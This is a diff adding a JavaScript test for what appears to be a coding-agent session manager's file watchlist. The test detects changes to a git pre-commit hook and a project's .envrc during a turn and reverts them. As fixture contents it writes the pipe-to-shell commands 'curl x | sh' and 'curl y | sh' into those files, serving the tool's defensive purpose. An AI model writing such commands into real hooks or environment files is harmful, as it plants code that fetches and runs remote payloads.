@@ -272,6 +272,37 @@ test('watchlist: a snapshot before the turn\'s first prompt goes, one after its 
   mgr.closeAll();
 });
 
+test('watchlist: a session in a project watches the workspace\'s own files and its project\'s; Revert puts each back in its folder', async () => {
+  const APP = { rel: 'app', abs: '/workspace/app' };
+  const wsHook0 = file('.git/hooks/pre-commit', 'true\n', 0o755), wsHook1 = file('.git/hooks/pre-commit', 'curl x | sh\n', 0o755);
+  const appEnv = file('.envrc', 'curl y | sh\n');
+  // per folder: the workspace's (root null) and the project's — before and after the turn
+  const snaps = { ws: [[wsHook0], [wsHook1]], app: [[], [appEnv]] };
+  const w = { calls: [], restores: [] };
+  w.snapshot = async (root) => { const k = root?.rel ? root.rel : 'ws'; w.calls.push(k); const l = snaps[k]; return { files: l.length > 1 ? l.shift() : l[0] }; };
+  w.restore = async (r, root) => { w.restores.push([r.path, root?.rel ?? null]); return { path: r.path, action: r.data === null ? 'trashed' : 'restored' }; };
+  const { mgr, events } = manager({ watcher: w, watchRootOf: (cwd) => (cwd === '/workspace/app' ? APP : null) });
+  const s = mgr.get(mgr.open({ cwd: '/workspace/app' }).id);
+  s.prompt({ text: 'do it' });
+  await tick(80);
+  assert.deepEqual(w.calls.sort(), ['app', 'app', 'ws', 'ws'], 'both folders, at the turn\'s start and end');
+  const ev = events.map(([, , e]) => e).find((e) => e.type === 'watch');
+  assert.deepEqual(ev.changes.map((c) => [c.path, c.change]), [['.git/hooks/pre-commit', 'changed'], ['app/.envrc', 'added']],
+    'the workspace\'s hook too (a project is no boundary); the project\'s files as paths of the workspace');
+  const r = await s.revertWatch(ev.id);
+  assert.ok(r.every((x) => x.ok), JSON.stringify(r));
+  assert.deepEqual(w.restores.sort(), [['.envrc', 'app'], ['.git/hooks/pre-commit', null]], 'each in its own folder, by its path there');
+  mgr.closeAll();
+  // a session of the workspace: one snapshot, as before projects
+  const w2 = { calls: [] };
+  w2.snapshot = async (root) => { w2.calls.push(root); return { files: [] }; };
+  const m2 = manager({ watcher: w2 }).mgr;
+  m2.get(m2.open({}).id).prompt({ text: 'x' });
+  await tick(80);
+  assert.deepEqual(w2.calls, [null, null]);
+  m2.closeAll();
+});
+
 test('watchlist: the page asks for a check now (the Review pane changed a watched file): told at once, not again at the next turn', async () => {
   const env0 = file('.envrc', 'x=1\n'), env1 = file('.envrc', 'curl x | sh\n');
   const w = watcher([[env0], [env0], [env1], [env1]]);
